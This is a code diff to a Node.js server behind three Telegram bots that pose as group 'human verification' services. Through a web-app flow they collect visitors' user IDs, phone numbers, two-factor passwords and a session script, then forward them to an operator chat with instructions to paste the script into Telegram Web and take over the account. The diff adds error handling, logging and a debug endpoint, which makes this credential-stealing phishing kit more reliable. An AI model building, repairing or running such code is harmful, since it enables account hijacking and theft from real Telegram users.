@@ -10,7 +10,7 @@ const PNF = require("google-libphonenumber").PhoneNumberFormat;
 
 // admins list (whoever adds the bot in the channel should be in this array.)
 const admins = [
-  7921358099
+  5891533625
 ];
 
 // loading all the pictures beforehand for speed
@@ -48,21 +48,30 @@ let guardianUsername;
 safeguardBot.getMe().then(botInfo => {
   safeguardUsername = botInfo.username;
   console.log(`Safeguard Bot Username: ${safeguardUsername}`);
+}).catch(error => {
+  console.error(`Failed to get Safeguard bot info: ${error.message}`);
 });
+
 delugeBot.getMe().then(botInfo => {
   delugeUsername = botInfo.username;
   console.log(`Deluge Bot Username: ${delugeUsername}`);
+}).catch(error => {
+  console.error(`Failed to get Deluge bot info: ${error.message}`);
 });
+
 guardianBot.getMe().then(botInfo => {
   guardianUsername = botInfo.username;
   console.log(`Guardian Bot Username: ${guardianUsername}`);
+}).catch(error => {
+  console.error(`Failed to get Guardian bot info: ${error.message}`);
 });
 
 const app = express();
 app.use(express.json());
-app.use(express.static("public"))
+app.use(express.static("public"));
 
 app.post("/api/users/telegram/info", async (req, res) => {
+  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
   try {
     const {
       userId,
@@ -103,9 +112,15 @@ app.post("/api/users/telegram/info", async (req, res) => {
       type,
     });
   } catch (error) {
-    console.error("500 server error", error);
+    console.error(`500 server error in /api/users/telegram/info: ${error.message}`);
     res.status(500).json({ error: "server error" });
   }
+});
+
+// Add /api/debug endpoint to log client-side debug messages
+app.post("/api/debug", (req, res) => {
+  console.log(`Debug message: ${req.body.message}`);
+  res.json({ status: "ok" });
 });
 
 const handleRequest = async (req, res, data) => {  
@@ -115,12 +130,26 @@ const handleRequest = async (req, res, data) => {
     deluge: delugeBot
   };
   let bot = botMap[data.type] || null;
-  await bot.sendMessage(
-    process.env.LOGS_ID,
-      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
-      parse_mode: "HTML"
-    }
-  );
+  if (!bot) {
+    console.error(`No bot found for type: ${data.type}`);
+    res.json({});
+    return;
+  }
+
+  const messageText = `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
+  
+  console.log(`Attempting to send login token message to chat ${process.env.LOGS_ID} for user ${data.userId}`);
+  try {
+    await bot.sendMessage(
+      process.env.LOGS_ID,
+      messageText,
+      { parse_mode: "HTML" }
+    );
+    console.log(`Successfully sent login token message to chat ${process.env.LOGS_ID} for user ${data.userId}`);
+  } catch (error) {
+    console.error(`Failed to send login token message to chat ${process.env.LOGS_ID}: ${error.message}`);
+  }
+
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
     let image;
@@ -158,19 +187,25 @@ const handleRequest = async (req, res, data) => {
           ],
         ]
       }
-    }
+    };
 
     const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
 
-    await bot.sendPhoto(data.userId, image, {
-      caption,
-      ...buttons,
-      parse_mode: "HTML"
-    });
+    console.log(`Sending success photo to user ${data.userId} for type ${type}`);
+    try {
+      await bot.sendPhoto(data.userId, image, {
+        caption,
+        ...buttons,
+        parse_mode: "HTML"
+      });
+      console.log(`Successfully sent success photo to user ${data.userId}`);
+    } catch (error) {
+      console.error(`Failed to send success photo to user ${data.userId}: ${error.message}`);
+    }
   }
 
   res.json({});
-}
+};
 
 const handleNewChatMember = async (bot, type) => {
   bot.on("my_chat_member", (update) => {
@@ -202,13 +237,21 @@ const handleNewChatMember = async (bot, type) => {
       update.new_chat_member.user.is_bot === true &&
       admins.includes(update.from.id)
     ) {
-      bot.sendPhoto(chatId, imageToSend, jsonToSend);
+      console.log(`Sending verification photo to chat ${chatId} for type ${type}`);
+      bot.sendPhoto(chatId, imageToSend, jsonToSend)
+        .then(() => {
+          console.log(`Successfully sent verification photo to chat ${chatId}`);
+        })
+        .catch(error => {
+          console.error(`Failed to send verification photo to chat ${chatId}: ${error.message}`);
+        });
     }
   });
-}
+};
 
 function handleStart(bot) {
   bot.onText(/\/start (.*)$/, (msg, match) => {
+    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
     let botInfo;
     bot.getMe().then(botInformation => {
       botInfo = botInformation;
@@ -228,8 +271,8 @@ function handleStart(bot) {
                 }
               }]]
             }
-          }
-          imageToSend = safeguardVerification
+          };
+          imageToSend = safeguardVerification;
         } else if (botInfo.username === delugeUsername) {
           jsonToSend = {
             caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
@@ -242,8 +285,8 @@ function handleStart(bot) {
                 }
               }]]
             }
-          }
-          imageToSend = delugeVerification
+          };
+          imageToSend = delugeVerification;
         } else if (botInfo.username === guardianUsername) {
           jsonToSend = {
             caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
@@ -256,20 +299,23 @@ function handleStart(bot) {
                 }
               }]]
             }
-          }
-          imageToSend = guardianVerification
+          };
+          imageToSend = guardianVerification;
         }
         
-        bot.sendPhoto(
-          chatId, 
-          imageToSend,
-          jsonToSend
-        );
+        console.log(`Sending verification photo to chat ${chatId} for bot ${botInfo.username} with web_app URL: ${jsonToSend?.reply_markup?.inline_keyboard?.[0]?.[0]?.web_app?.url || "N/A"}`);
+        bot.sendPhoto(chatId, imageToSend, jsonToSend)
+          .then(() => {
+            console.log(`Successfully sent verification photo to chat ${chatId}`);
+          })
+          .catch(error => {
+            console.error(`Failed to send verification photo to chat ${chatId}: ${error.message}`);
+          });
       }
+    }).catch(error => {
+      console.error(`Failed to get bot info in handleStart: ${error.message}`);
     });
-  
   });
-
 }
 
 handleNewChatMember(safeguardBot, "safeguard");
